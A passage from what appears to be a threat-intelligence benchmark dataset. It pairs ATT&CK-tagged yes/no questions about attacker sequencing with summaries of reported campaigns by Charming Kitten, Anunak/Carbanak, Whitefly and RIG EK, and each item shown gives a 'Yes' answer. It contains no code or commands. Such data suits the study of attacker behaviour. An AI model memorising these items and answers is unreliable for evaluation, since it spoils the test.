Others: ClearSky Security Ltd. attributed the campaign to Charming Kitten based on factors such as the use of specific websites linked in the attack, the targeting of non-Iranian investigators whose expertise fits Charming Kitten's TTPs, and the impersonation of NIAC, indicating an Iranian actor. The group's activity was also tied to Iran through the NetBlock of the IP addresses of the original servers, which included an Iranian company's website.",Yes,The-Kittens-Are-Back-in-Town-Charming-Kitten-2019
2050,357,357-Credential Access-T1606-Forge Web Credentials,Is it likely that Charming Kitten impersonated well-known researchers or journalists to send socially engineered email messages for initial access before creating phishing websites that impersonated Instagram and Google services for credential theft?,"Credential Access: The attackers created phishing websites impersonating Instagram and Google services to steal credentials from victims. These websites were part of the campaign's second stage, which likely aimed at data theft.","Reconnaissance: In 2019, the Iranian cyberespionage group Charming Kitten, also known as APT35 or Ajax, initiated a new cyber espionage campaign targeting non-Iranian researchers from the US, Middle East, and France, focusing on academic research of Iran, as well as Iranian dissidents in the US. The group impersonated well-known researchers or journalists and invited recipients to events, using the targets' language in some cases. They also added trackers to their email correspondences to follow forwarded emails and obtain geolocation information.
Resource Development: Charming Kitten's campaign involved the use of fake websites impersonating various entities and services, including Google services like Gmail or Google Drive, and for the first time, Instagram's official website. These websites were used to extract credentials and were hosted on servers provided by BelCloud Hosting Corporation in Bulgaria. The attackers switched servers used to store email addresses containing thousands of addresses after a month of campaign operations.
Initial Access: The campaign's first stage involved sending socially engineered email messages impersonating known researchers or journalists, inviting victims to events. The second stage redirected victims to decoy websites impersonating Google services and other entities. In August 2019, the group expanded its activities to target influential public figures worldwide.
Defense Evasion: Charming Kitten used email trackers to monitor whether their phishing emails were forwarded and to collect victims' geolocation and IP addresses. They also used a cookie installed on the victim's machine to gather data.
Command and Control: Charming Kitten used more than six unique servers to host their fake websites, with four impersonating entities and two impersonating Google services. The servers were used to control the phishing websites and collect stolen data.
Others: ClearSky Security Ltd. attributed the campaign to Charming Kitten based on factors such as the use of specific websites linked in the attack, the targeting of non-Iranian investigators whose expertise fits Charming Kitten's TTPs, and the impersonation of NIAC, indicating an Iranian actor. The group's activity was also tied to Iran through the NetBlock of the IP addresses of the original servers, which included an Iranian company's website.",Yes,The-Kittens-Are-Back-in-Town-Charming-Kitten-2019
2051,357,357-Credential Access-T1056-Input Capture,"After redirecting victims to decoy websites impersonating Google services and other entities during the initial access stage, is it likely that Charming Kitten will create phishing websites impersonating Instagram and Google services for the purpose of stealing credentials?","Credential Access: The attackers created phishing websites impersonating Instagram and Google services to steal credentials from victims. These websites were part of the campaign's second stage, which likely aimed at data theft.","Reconnaissance: In 2019, the Iranian cyberespionage group Charming Kitten, also known as APT35 or Ajax, initiated a new cyber espionage campaign targeting non-Iranian researchers from the US, Middle East, and France, focusing on academic research of Iran, as well as Iranian dissidents in the US. The group impersonated well-known researchers or journalists and invited recipients to events, using the targets' language in some cases. They also added trackers to their email correspondences to follow forwarded emails and obtain geolocation information.
Resource Development: Charming Kitten's campaign involved the use of fake websites impersonating various entities and services, including Google services like Gmail or Google Drive, and for the first time, Instagram's official website. These websites were used to extract credentials and were hosted on servers provided by BelCloud Hosting Corporation in Bulgaria. The attackers switched servers used to store email addresses containing thousands of addresses after a month of campaign operations.
Initial Access: The campaign's first stage involved sending socially engineered email messages impersonating known researchers or journalists, inviting victims to events. The second stage redirected victims to decoy websites impersonating Google services and other entities. In August 2019, the group expanded its activities to target influential public figures worldwide.
Defense Evasion: Charming Kitten used email trackers to monitor whether their phishing emails were forwarded and to collect victims' geolocation and IP addresses. They also used a cookie installed on the victim's machine to gather data.
Command and Control: Charming Kitten used more than six unique servers to host their fake websites, with four impersonating entities and two impersonating Google services. The servers were used to control the phishing websites and collect stolen data.
Others: ClearSky Security Ltd. attributed the campaign to Charming Kitten based on factors such as the use of specific websites linked in the attack, the targeting of non-Iranian investigators whose expertise fits Charming Kitten's TTPs, and the impersonation of NIAC, indicating an Iranian actor. The group's activity was also tied to Iran through the NetBlock of the IP addresses of the original servers, which included an Iranian company's website.",Yes,The-Kittens-Are-Back-in-Town-Charming-Kitten-2019
2054,357,357-Resource Development-T1586-Compromise Accounts,"After impersonating well-known researchers or journalists to send socially engineered emails and redirecting victims to decoy websites for initial access, is it likely that Charming Kitten developed and used fake websites impersonating Google services and Instagram's official website, hosted on servers provided by BelCloud Hosting Corporation, for resource development?","Resource Development: Charming Kitten's campaign involved the use of fake websites impersonating various entities and services, including Google services like Gmail or Google Drive, and for the first time, Instagram's official website. These websites were used to extract credentials and were hosted on servers provided by BelCloud Hosting Corporation in Bulgaria. The attackers switched servers used to store email addresses containing thousands of addresses after a month of campaign operations.","Reconnaissance: In 2019, the Iranian cyberespionage group Charming Kitten, also known as APT35 or Ajax, initiated a new cyber espionage campaign targeting non-Iranian researchers from the US, Middle East, and France, focusing on academic research of Iran, as well as Iranian dissidents in the US. The group impersonated well-known researchers or journalists and invited recipients to events, using the targets' language in some cases. They also added trackers to their email correspondences to follow forwarded emails and obtain geolocation information.
Initial Access: The campaign's first stage involved sending socially engineered email messages impersonating known researchers or journalists, inviting victims to events. The second stage redirected victims to decoy websites impersonating Google services and other entities. In August 2019, the group expanded its activities to target influential public figures worldwide.
Defense Evasion: Charming Kitten used email trackers to monitor whether their phishing emails were forwarded and to collect victims' geolocation and IP addresses. They also used a cookie installed on the victim's machine to gather data.
Credential Access: The attackers created phishing websites impersonating Instagram and Google services to steal credentials from victims. These websites were part of the campaign's second stage, which likely aimed at data theft.
Command and Control: Charming Kitten used more than six unique servers to host their fake websites, with four impersonating entities and two impersonating Google services. The servers were used to control the phishing websites and collect stolen data.
Others: ClearSky Security Ltd. attributed the campaign to Charming Kitten based on factors such as the use of specific websites linked in the attack, the targeting of non-Iranian investigators whose expertise fits Charming Kitten's TTPs, and the impersonation of NIAC, indicating an Iranian actor. The group's activity was also tied to Iran through the NetBlock of the IP addresses of the original servers, which included an Iranian company's website.",Yes,The-Kittens-Are-Back-in-Town-Charming-Kitten-2019
2056,358,358-Command and Control-T1573-Encrypted Channel,"After leveraging Metasploit for port scanning, system reconnaissance, and privilege escalation during lateral movement, is it likely that the Anunak malware will connect to backends using backconnect SSL and DNS tunneling for command and control activities?","Command and Control: The Anunak malware connected to backends using a PHP based backend reachable over HTTP and HTTPS, and a Windows server based component using a proprietary protocol. Various stealth methods including backconnect SSL and DNS tunneling were used for compromise persistence and data exfiltration.","Initial Access: The organized criminal group employed targeted emailing (spear phishing) and infections from other botnets as their primary methods for penetrating internal networks. Since August 2014, the group began creating their own large botnet using mass emailing, but not typical exploit drive-by infections, likely to reduce the need for external contacts.
Execution: The group used various tools for their attacks, including Mimikatz to get passwords, MBR Eraser to crack operating systems, SoftPerfect Network Scanner for LAN scanning, Cain & Abel and SSHD backdoor for password retrieval and remote access, and Ammy Admin and Team Viewer for remote control. The core malware Anunak, along with these tools, was used to carry out targeted attacks, mainly on banks and payment systems.
Persistence: The attackers gained access to ATM management infrastructure and infected those systems with their own malicious software, allowing theft from the banks' ATM systems on command. They also gained access to email and workflow servers, server and banking system administrator workstations, and configured remote access to servers of interest, including firewall configuration changes.
Defense Evasion: The attackers used the program RDPdoor for remote access and the program 'MBR Eraser' to remove traces and crack Windows computers and servers. They also used legitimate programs such as Ammy Admin and Team Viewer for remote access to reduce the risk of losing access to the internal bank network.
Credential Access: The attackers compromised domain administrator passwords and gained access to all active domain accounts, including email servers, which allowed them to control all internal communications and take countermeasures against bank employees' efforts to solve the problem.
Lateral Movement: The attackers used Metasploit for port scanning, system reconnaissance, escalating privileges, gathering credentials, and hopping onto other systems and networks. They also used VNC scanning and password brute forcing, added additional administrator accounts, and used RDP Wrapper to allow concurrent RDP sessions to gain access and achieve persistent access to compromised systems.
Impact: The attackers changed denominations of issued banknotes in the ATM operating system registry, allowing them to withdraw large amounts of cash directly from ATMs. They also used a modified debug program that allowed them to issue money from the dispenser without opening the ATM housing and the vault door.",Yes,Anunak_APT_against_financial_institutions
2058,358,358-Credential Access-T1003-OS Credential Dumping,"After stealing money from ATMs by issuing commands through the malicious ATM software and manipulating the ATM operating system registry, is it likely that the attackers used compromised domain administrator passwords to gain access to all active domain accounts before facilitating further lateral movement such as adding additional administrator accounts or using RDP Wrapper for concurrent RDP sessions?","Credential Access: The attackers compromised domain administrator passwords and gained access to all active domain accounts, including email servers, which allowed them to control all internal communications and take countermeasures against bank employees' efforts to solve the problem.","Initial Access: The organized criminal group employed targeted emailing (spear phishing) and infections from other botnets as their primary methods for penetrating internal networks. Since August 2014, the group began creating their own large botnet using mass emailing, but not typical exploit drive-by infections, likely to reduce the need for external contacts.
Execution: The group used various tools for their attacks, including Mimikatz to get passwords, MBR Eraser to crack operating systems, SoftPerfect Network Scanner for LAN scanning, Cain & Abel and SSHD backdoor for password retrieval and remote access, and Ammy Admin and Team Viewer for remote control. The core malware Anunak, along with these tools, was used to carry out targeted attacks, mainly on banks and payment systems.
Persistence: The attackers gained access to ATM management infrastructure and infected those systems with their own malicious software, allowing theft from the banks' ATM systems on command. They also gained access to email and workflow servers, server and banking system administrator workstations, and configured remote access to servers of interest, including firewall configuration changes.
Defense Evasion: The attackers used the program RDPdoor for remote access and the program 'MBR Eraser' to remove traces and crack Windows computers and servers. They also used legitimate programs such as Ammy Admin and Team Viewer for remote access to reduce the risk of losing access to the internal bank network.
Lateral Movement: The attackers used Metasploit for port scanning, system reconnaissance, escalating privileges, gathering credentials, and hopping onto other systems and networks. They also used VNC scanning and password brute forcing, added additional administrator accounts, and used RDP Wrapper to allow concurrent RDP sessions to gain access and achieve persistent access to compromised systems.
Command and Control: The Anunak malware connected to backends using a PHP based backend reachable over HTTP and HTTPS, and a Windows server based component using a proprietary protocol. Various stealth methods including backconnect SSL and DNS tunneling were used for compromise persistence and data exfiltration.
Impact: The attackers changed denominations of issued banknotes in the ATM operating system registry, allowing them to withdraw large amounts of cash directly from ATMs. They also used a modified debug program that allowed them to issue money from the dispenser without opening the ATM housing and the vault door.",Yes,Anunak_APT_against_financial_institutions
2060,358,358-Impact-T1657-Financial Theft,"After utilizing the Anunak malware for stealthy communication with command and control servers and maintaining persistence, is it likely that the attackers will change the denominations of issued banknotes in the ATM registry and use a modified debug program to withdraw cash directly from ATMs without opening the housing or vault door?","Impact: The attackers changed denominations of issued banknotes in the ATM operating system registry, allowing them to withdraw large amounts of cash directly from ATMs. They also used a modified debug program that allowed them to issue money from the dispenser without opening the ATM housing and the vault door.","Initial Access: The organized criminal group employed targeted emailing (spear phishing) and infections from other botnets as their primary methods for penetrating internal networks. Since August 2014, the group began creating their own large botnet using mass emailing, but not typical exploit drive-by infections, likely to reduce the need for external contacts.
Execution: The group used various tools for their attacks, including Mimikatz to get passwords, MBR Eraser to crack operating systems, SoftPerfect Network Scanner for LAN scanning, Cain & Abel and SSHD backdoor for password retrieval and remote access, and Ammy Admin and Team Viewer for remote control. The core malware Anunak, along with these tools, was used to carry out targeted attacks, mainly on banks and payment systems.
Persistence: The attackers gained access to ATM management infrastructure and infected those systems with their own malicious software, allowing theft from the banks' ATM systems on command. They also gained access to email and workflow servers, server and banking system administrator workstations, and configured remote access to servers of interest, including firewall configuration changes.
Defense Evasion: The attackers used the program RDPdoor for remote access and the program 'MBR Eraser' to remove traces and crack Windows computers and servers. They also used legitimate programs such as Ammy Admin and Team Viewer for remote access to reduce the risk of losing access to the internal bank network.
Credential Access: The attackers compromised domain administrator passwords and gained access to all active domain accounts, including email servers, which allowed them to control all internal communications and take countermeasures against bank employees' efforts to solve the problem.
Lateral Movement: The attackers used Metasploit for port scanning, system reconnaissance, escalating privileges, gathering credentials, and hopping onto other systems and networks. They also used VNC scanning and password brute forcing, added additional administrator accounts, and used RDP Wrapper to allow concurrent RDP sessions to gain access and achieve persistent access to compromised systems.
Command and Control: The Anunak malware connected to backends using a PHP based backend reachable over HTTP and HTTPS, and a Windows server based component using a proprietary protocol. Various stealth methods including backconnect SSL and DNS tunneling were used for compromise persistence and data exfiltration.",Yes,Anunak_APT_against_financial_institutions
2065,36,36-Execution-T1129-Shared Modules,"After Whitefly sends spear-phishing emails containing a dropper disguised as job-related documents or images, is it likely that the loader Trojan.Vcrodat will execute DLLs using search order hijacking before deploying Termite to maintain long-term persistence on compromised machines?","Execution: The loader Trojan.Vcrodat, used by Whitefly, employs search order hijacking to execute malicious DLLs named identically to legitimate security software DLLs, gaining elevated privileges. It then loads an encrypted payload that establishes communication with a command and control (C&C) domain, downloading additional tools for further operations.","Initial Access: Whitefly, an espionage group targeting Singapore, initiates its attacks by sending spear-phishing emails containing a dropper disguised as a document or image, often related to job openings or industry-specific information. The dropper, once opened, executes a loader named Trojan.Vcrodat.
Persistence: Whitefly aims to maintain long-term access within compromised organizations, often for months, to exfiltrate large volumes of information. It deploys tools like a simple remote shell and Termite (Hacktool.Rootkit) to facilitate ongoing communication and control over infected computers.
Privilege Escalation: Whitefly exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) using an open-source tool and leverages Mimikatz (Hacktool.Mimikatz) to obtain credentials, allowing them to compromise additional machines and escalate privileges within the network.
Defense Evasion: Whitefly utilizes search order hijacking to ensure execution of its malicious DLLs, targeting security applications to potentially gain higher privileges. The group also uses custom malware and open-source hacking tools to remain undetected while maintaining a presence on networks.
Credential Access: The group heavily relies on tools like Mimikatz to harvest credentials, which are then used to compromise more machines on the network and facilitate lateral movement.
Discovery: After initial infection, Whitefly maps the network and infects further computers, using publicly available tools and exploiting vulnerabilities to discover and control more systems.
Lateral Movement: Using stolen credentials, Whitefly compromises additional machines on the network, repeating the process to gain access to desired data and expand their control within the organization.
Collection: Whitefly's objective is to steal large volumes of sensitive information, which involves remaining in the network for extended periods and using tools to facilitate data theft.
Command and Control: Whitefly configures multiple C&C domains for each target, using encrypted payloads to communicate with infected computers and download additional tools for command and control.
Exfiltration: The group's long-term presence within targeted organizations is leveraged to exfiltrate large volumes of information over time.
Others: Whitefly has been active since at least 2017, targeting various sectors in Singapore. The group is linked to the SingHealth breach and other attacks in the region. Symantec has identified multiple indicators of compromise and has protections in place against Whitefly's tactics. The Attack Investigation Team at Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Whitefly_ Espionage Group has Singapore in Its Sights
2072,36,36-Discovery-T1046-Network Service Discovery,"After leveraging stolen credentials to compromise additional machines and achieve lateral movement, is it likely that Whitefly will use publicly available tools and exploit vulnerabilities for network service discovery before using tools to steal large volumes of sensitive information for collection?","Discovery: After initial infection, Whitefly maps the network and infects further computers, using publicly available tools and exploiting vulnerabilities to discover and control more systems.","Initial Access: Whitefly, an espionage group targeting Singapore, initiates its attacks by sending spear-phishing emails containing a dropper disguised as a document or image, often related to job openings or industry-specific information. The dropper, once opened, executes a loader named Trojan.Vcrodat.
Execution: The loader Trojan.Vcrodat, used by Whitefly, employs search order hijacking to execute malicious DLLs named identically to legitimate security software DLLs, gaining elevated privileges. It then loads an encrypted payload that establishes communication with a command and control (C&C) domain, downloading additional tools for further operations.
Persistence: Whitefly aims to maintain long-term access within compromised organizations, often for months, to exfiltrate large volumes of information. It deploys tools like a simple remote shell and Termite (Hacktool.Rootkit) to facilitate ongoing communication and control over infected computers.
Privilege Escalation: Whitefly exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) using an open-source tool and leverages Mimikatz (Hacktool.Mimikatz) to obtain credentials, allowing them to compromise additional machines and escalate privileges within the network.
Defense Evasion: Whitefly utilizes search order hijacking to ensure execution of its malicious DLLs, targeting security applications to potentially gain higher privileges. The group also uses custom malware and open-source hacking tools to remain undetected while maintaining a presence on networks.
Credential Access: The group heavily relies on tools like Mimikatz to harvest credentials, which are then used to compromise more machines on the network and facilitate lateral movement.
Lateral Movement: Using stolen credentials, Whitefly compromises additional machines on the network, repeating the process to gain access to desired data and expand their control within the organization.
Collection: Whitefly's objective is to steal large volumes of sensitive information, which involves remaining in the network for extended periods and using tools to facilitate data theft.
Command and Control: Whitefly configures multiple C&C domains for each target, using encrypted payloads to communicate with infected computers and download additional tools for command and control.
Exfiltration: The group's long-term presence within targeted organizations is leveraged to exfiltrate large volumes of information over time.
Others: Whitefly has been active since at least 2017, targeting various sectors in Singapore. The group is linked to the SingHealth breach and other attacks in the region. Symantec has identified multiple indicators of compromise and has protections in place against Whitefly's tactics. The Attack Investigation Team at Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Whitefly_ Espionage Group has Singapore in Its Sights
2073,36,36-Lateral Movement-T1550-Use Alternate Authentication Material,"After mapping the network and infecting further computers during the discovery phase using publicly available tools and exploiting vulnerabilities, is it likely that Whitefly will compromise additional machines using stolen credentials before targeting desired data to expand their control within the organization?","Lateral Movement: Using stolen credentials, Whitefly compromises additional machines on the network, repeating the process to gain access to desired data and expand their control within the organization.","Initial Access: Whitefly, an espionage group targeting Singapore, initiates its attacks by sending spear-phishing emails containing a dropper disguised as a document or image, often related to job openings or industry-specific information. The dropper, once opened, executes a loader named Trojan.Vcrodat.
Execution: The loader Trojan.Vcrodat, used by Whitefly, employs search order hijacking to execute malicious DLLs named identically to legitimate security software DLLs, gaining elevated privileges. It then loads an encrypted payload that establishes communication with a command and control (C&C) domain, downloading additional tools for further operations.
Persistence: Whitefly aims to maintain long-term access within compromised organizations, often for months, to exfiltrate large volumes of information. It deploys tools like a simple remote shell and Termite (Hacktool.Rootkit) to facilitate ongoing communication and control over infected computers.
Privilege Escalation: Whitefly exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) using an open-source tool and leverages Mimikatz (Hacktool.Mimikatz) to obtain credentials, allowing them to compromise additional machines and escalate privileges within the network.
Defense Evasion: Whitefly utilizes search order hijacking to ensure execution of its malicious DLLs, targeting security applications to potentially gain higher privileges. The group also uses custom malware and open-source hacking tools to remain undetected while maintaining a presence on networks.
Credential Access: The group heavily relies on tools like Mimikatz to harvest credentials, which are then used to compromise more machines on the network and facilitate lateral movement.
Discovery: After initial infection, Whitefly maps the network and infects further computers, using publicly available tools and exploiting vulnerabilities to discover and control more systems.
Collection: Whitefly's objective is to steal large volumes of sensitive information, which involves remaining in the network for extended periods and using tools to facilitate data theft.
Command and Control: Whitefly configures multiple C&C domains for each target, using encrypted payloads to communicate with infected computers and download additional tools for command and control.
Exfiltration: The group's long-term presence within targeted organizations is leveraged to exfiltrate large volumes of information over time.
Others: Whitefly has been active since at least 2017, targeting various sectors in Singapore. The group is linked to the SingHealth breach and other attacks in the region. Symantec has identified multiple indicators of compromise and has protections in place against Whitefly's tactics. The Attack Investigation Team at Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Whitefly_ Espionage Group has Singapore in Its Sights
2074,36,36-Command and Control-T1573-Encrypted Channel,"After using stolen credentials for lateral movement across the network to compromise additional machines, is Whitefly likely to configure multiple C&C domains, use encrypted payloads to communicate with infected computers, and download additional tools for command and control?","Command and Control: Whitefly configures multiple C&C domains for each target, using encrypted payloads to communicate with infected computers and download additional tools for command and control.","Initial Access: Whitefly, an espionage group targeting Singapore, initiates its attacks by sending spear-phishing emails containing a dropper disguised as a document or image, often related to job openings or industry-specific information. The dropper, once opened, executes a loader named Trojan.Vcrodat.
Execution: The loader Trojan.Vcrodat, used by Whitefly, employs search order hijacking to execute malicious DLLs named identically to legitimate security software DLLs, gaining elevated privileges. It then loads an encrypted payload that establishes communication with a command and control (C&C) domain, downloading additional tools for further operations.
Persistence: Whitefly aims to maintain long-term access within compromised organizations, often for months, to exfiltrate large volumes of information. It deploys tools like a simple remote shell and Termite (Hacktool.Rootkit) to facilitate ongoing communication and control over infected computers.
Privilege Escalation: Whitefly exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) using an open-source tool and leverages Mimikatz (Hacktool.Mimikatz) to obtain credentials, allowing them to compromise additional machines and escalate privileges within the network.
Defense Evasion: Whitefly utilizes search order hijacking to ensure execution of its malicious DLLs, targeting security applications to potentially gain higher privileges. The group also uses custom malware and open-source hacking tools to remain undetected while maintaining a presence on networks.
Credential Access: The group heavily relies on tools like Mimikatz to harvest credentials, which are then used to compromise more machines on the network and facilitate lateral movement.
Discovery: After initial infection, Whitefly maps the network and infects further computers, using publicly available tools and exploiting vulnerabilities to discover and control more systems.
Lateral Movement: Using stolen credentials, Whitefly compromises additional machines on the network, repeating the process to gain access to desired data and expand their control within the organization.
Collection: Whitefly's objective is to steal large volumes of sensitive information, which involves remaining in the network for extended periods and using tools to facilitate data theft.
Exfiltration: The group's long-term presence within targeted organizations is leveraged to exfiltrate large volumes of information over time.
Others: Whitefly has been active since at least 2017, targeting various sectors in Singapore. The group is linked to the SingHealth breach and other attacks in the region. Symantec has identified multiple indicators of compromise and has protections in place against Whitefly's tactics. The Attack Investigation Team at Symantec Security Response is dedicated to investigating targeted attacks and enhancing protection in Symantec products.",Yes,Whitefly_ Espionage Group has Singapore in Its Sights
2075,360,360-Execution-T1059-Command and Scripting Interpreter,Is it likely that RIG EK delivers exploits through malvertising by redirecting users to advertising pages or compromised websites before running an obfuscated PowerShell script to fetch malware using the Command and Scripting Interpreter?,"Execution: Upon successful execution on the victim machine, RIG EK runs an obfuscated PowerShell script to fetch malware from the C&C infrastructure, using Command and Scripting Interpreter and Exploitation for Client Execution techniques.","Resource Development: RIG EK uses known browser vulnerabilities to execute commands on victim machines, which are slightly modified versions of publicly available exploits, usually obfuscated. This behavior falls under Obtain Capabilities and Compromise Infrastructure techniques. RIG EK also uses malvertising and compromised websites to redirect users to its landing page.
Initial Access: RIG EK delivers exploits to victims through malvertising, redirecting users to advertising pages that execute RIG exploits, or by visiting compromised sites with injected exploit kit javascript. This process is non-disruptive and requires limited interaction, aligning with the Drive-by Compromise technique.
Defense Evasion: RIG EK uses proxy servers to make infections harder to detect and has an integrated Antivirus testing feature to check if the malware is detected by popular antivirus software.
Command and Control: RIG EK's infrastructure includes Virtual Dedicated Servers (VDS), proxy servers, and an API server. The API serves the exploit through the proxy server, which is a reverse proxy to the VDS. The exploit server detects the user's browser and returns the exploit code encrypted with a custom version of the RC4 algorithm.
Others: RIG EK has been active since 2014, distributing various types of malware, including Dridex, RaccoonStealer, and SmokeLoader. It targets machines running outdated versions of Internet Explorer. With new exploits added to its arsenal, RIG EK achieved a 30% exploitation rate in 2022. The exploit kit operates as a service model, distributing different types of malware for various threat actors. It has intercepted victim traffic from 207 countries, with the most successful campaigns in Russia, Mexico, Brazil, and the Middle East. The highest exploit try rates and successful infections occurred on Tuesdays, Wednesdays, and Thursdays. RIG EK's operators have a close relationship with the developer of Dridex malware.",Yes,[RIG] RIG Exploit Kit_ In-Depth Analysis
2079,360,360-Command and Control-T1573-Encrypted Channel,"After using proxy servers within its infrastructure to make infections harder to detect, is it likely that RIG EK's exploit server will return encrypted exploit code using a custom version of the RC4 algorithm for establishing an encrypted channel in its command and control operations?","Command and Control: RIG EK's infrastructure includes Virtual Dedicated Servers (VDS), proxy servers, and an API server. The API serves the exploit through the proxy server, which is a reverse proxy to the VDS. The exploit server detects the user's browser and returns the exploit code encrypted with a custom version of the RC4 algorithm.","Resource Development: RIG EK uses known browser vulnerabilities to execute commands on victim machines, which are slightly modified versions of publicly available exploits, usually obfuscated. This behavior falls under Obtain Capabilities and Compromise Infrastructure techniques. RIG EK also uses malvertising and compromised websites to redirect users to its landing page.
Initial Access: RIG EK delivers exploits to victims through malvertising, redirecting users to advertising pages that execute RIG exploits, or by visiting compromised sites with injected exploit kit javascript. This process is non-disruptive and requires limited interaction, aligning with the Drive-by Compromise technique.
Execution: Upon successful execution on the victim machine, RIG EK runs an obfuscated PowerShell script to fetch malware from the C&C infrastructure, using Command and Scripting Interpreter and Exploitation for Client Execution techniques.
Defense Evasion: RIG EK uses proxy servers to make infections harder to detect and has an integrated Antivirus testing feature to check if the malware is detected by popular antivirus software.
Others: RIG EK has been active since 2014, distributing various types of malware, including Dridex, RaccoonStealer, and SmokeLoader. It targets machines running outdated versions of Internet Explorer. With new exploits added to its arsenal, RIG EK achieved a 30% exploitation rate in 2022. The exploit kit operates as a service model, distributing different types of malware for various threat actors. It has intercepted victim traffic from 207 countries, with the most successful campaigns in Russia, Mexico, Brazil, and the Middle East. The highest exploit try rates and successful infections occurred on Tuesdays, Wednesdays, and Thursdays. RIG EK's operators have a close relationship with the developer of Dridex malware.",Yes,[RIG] RIG Exploit Kit_ In-Depth Analysis
2082,360,360-Resource Development-T1584-Compromise Infrastructure,"After using known browser vulnerabilities to execute commands on victim machines and obtaining capabilities, is RIG EK likely to deliver exploits by redirecting users to advertising pages or compromised websites using malvertising before redirecting users to its landing page?","Resource Development: RIG EK uses known browser vulnerabilities to execute commands on victim machines, which are slightly modified versions of publicly available exploits, usually obfuscated. This behavior falls under Obtain Capabilities and Compromise Infrastructure techniques. RIG EK also uses malvertising and compromised websites to redirect users to its landing page.","Initial Access: RIG EK delivers exploits to victims through malvertising, redirecting users to advertising pages that execute RIG exploits, or by visiting compromised sites with injected exploit kit javascript. This process is non-disruptive and requires limited interaction, aligning with the Drive-by Compromise technique.
Execution: Upon successful execution on the victim machine, RIG EK runs an obfuscated PowerShell script to fetch malware from the C&C infrastructure, using Command and Scripting Interpreter and Exploitation for Client Execution techniques.
Defense Evasion: RIG EK uses proxy servers to make infections harder to detect and has an integrated Antivirus testing feature to check if the malware is detected by popular antivirus software.
Command and Control: RIG EK's infrastructure includes Virtual Dedicated Servers (VDS), proxy servers, and an API server. The API serves the exploit through the proxy server, which is a reverse proxy to the VDS. The exploit server detects the user's browser and returns the exploit code encrypted with a custom version of the RC4 algorithm.
Others: RIG EK has been active since 2014, distributing various types of malware, including Dridex, RaccoonStealer, and SmokeLoader. It targets machines running outdated versions of Internet Explorer. With new exploits added to its arsenal, RIG EK achieved a 30% exploitation rate in 2022. The exploit kit operates as a service model, distributing different types of malware for various threat actors. It has intercepted victim traffic from 207 countries, with the most successful campaigns in Russia, Mexico, Brazil, and the Middle East. The highest exploit try rates and successful infections occurred on Tuesdays, Wednesdays, and Thursdays. RIG EK's operators have a close relationship with the developer of Dridex malware.",Yes,[RIG] RIG Exploit Kit_ In-Depth Analysis
2083,361,361-Initial Access-T1566-Phishing,"After conducting reconnaissance by collecting data related to banking applications and internal procedures to avoid detection, is it likely that the Carbanak group used spear-phishing emails with malicious URLs and documents designed to download a Cobalt Strike beacon component to gain initial access before executing arbitrary payloads, running shell commands, and deleting files for operational needs?","Initial Access: The initial compromise involved spear-phishing emails with malicious URLs and documents designed to download a Cobalt Strike beacon component. Victims were tricked into opening these attachments, which used exploits for Remote Code Execution in Microsoft Word (CVE-2017-8570, CVE-2017-11882, and CVE-2018-0802).","Reconnaissance: The Carbanak group conducted reconnaissance by collecting data related to banking applications and internal procedures after business hours or on weekends to avoid detection. This information was prepared for exfiltration to be used in the final stage of the attack.
Execution: After the initial compromise, the adversary had the ability to download and execute new payloads, run shell commands to move laterally in the infrastructure, and delete files from the system to leave fewer forensic traces.
Persistence: The attackers established persistence in the infrastructure using a backdoor from the Command and Control Server.
Privilege Escalation: The attackers aimed to find admin-level credentials to move across the entire infrastructure, compromising a Domain Administrator account and using it throughout the duration of the attack.
Defense Evasion: The Carbanak group minimized detection opportunities by performing operations outside business hours, limiting interaction to a handful of systems, and using single workstations as a hub for centralizing collected information and communication with their C&C server.
Credential Access: The attackers compromised credentials for a Domain Administrator and used them to compromise at least two more endpoints by the end of the first day.
Discovery: The attackers used the Cobalt Strike beacon to discover and map the organization's internal network, collecting administrative level credentials and compromising additional network endpoints.
Lateral Movement: The attackers moved laterally across the infrastructure, compromising numerous workstations in search of critical information and targeting internal hosts and servers that would be used during the actual heist.
Collection: The attackers collected and prepared a series of potentially valuable documents pertaining to internal applications and procedures for exfiltration.
Command and Control: The Cobalt Strike beacon was used for command and control, allowing the attackers to communicate with compromised systems and check for new commands to be executed.
Exfiltration: The attackers prepared documents related to internal applications and procedures for exfiltration, which were relevant to the internal applications.
Others: The Carbanak group impersonated high-profile organizations in their spear-phishing campaigns, such as IBM, European Central Bank, and cybersecurity companies. The group's leader was apprehended in Spain on March 26th, 2018, but the group remained active with subsequent campaigns reported until May 2018. The group's use of Cobalt Strike – a pentesting tool – allowed them to infiltrate organizations, move laterally, exfiltrate data, and deploy anti-forensic and evasion tools.",Yes,An-APT-Blueprint-Gaining-New-Visibility-into-Financial-Threats-interactive
2086,361,361-Discovery-T1018-Remote System Discovery,"After the attackers established persistence using a backdoor from the Command and Control server and escalated privileges by compromising a Domain Administrator account, is it likely that they used the Cobalt Strike beacon to discover the organization's internal network, collect administrative level credentials, and compromise additional network endpoints?","Discovery: The attackers used the Cobalt Strike beacon to discover and map the organization's internal network, collecting administrative level credentials and compromising additional network endpoints.","Reconnaissance: The Carbanak group conducted reconnaissance by collecting data related to banking applications and internal procedures after business hours or on weekends to avoid detection. This information was prepared for exfiltration to be used in the final stage of the attack.
Initial Access: The initial compromise involved spear-phishing emails with malicious URLs and documents designed to download a Cobalt Strike beacon component. Victims were tricked into opening these attachments, which used exploits for Remote Code Execution in Microsoft Word (CVE-2017-8570, CVE-2017-11882, and CVE-2018-0802).
Execution: After the initial compromise, the adversary had the ability to download and execute new payloads, run shell commands to move laterally in the infrastructure, and delete files from the system to leave fewer forensic traces.
Persistence: The attackers established persistence in the infrastructure using a backdoor from the Command and Control Server.
Privilege Escalation: The attackers aimed to find admin-level credentials to move across the entire infrastructure, compromising a Domain Administrator account and using it throughout the duration of the attack.
Defense Evasion: The Carbanak group minimized detection opportunities by performing operations outside business hours, limiting interaction to a handful of systems, and using single workstations as a hub for centralizing collected information and communication with their C&C server.
Credential Access: The attackers compromised credentials for a Domain Administrator and used them to compromise at least two more endpoints by the end of the first day.
Lateral Movement: The attackers moved laterally across the infrastructure, compromising numerous workstations in search of critical information and targeting internal hosts and servers that would be used during the actual heist.
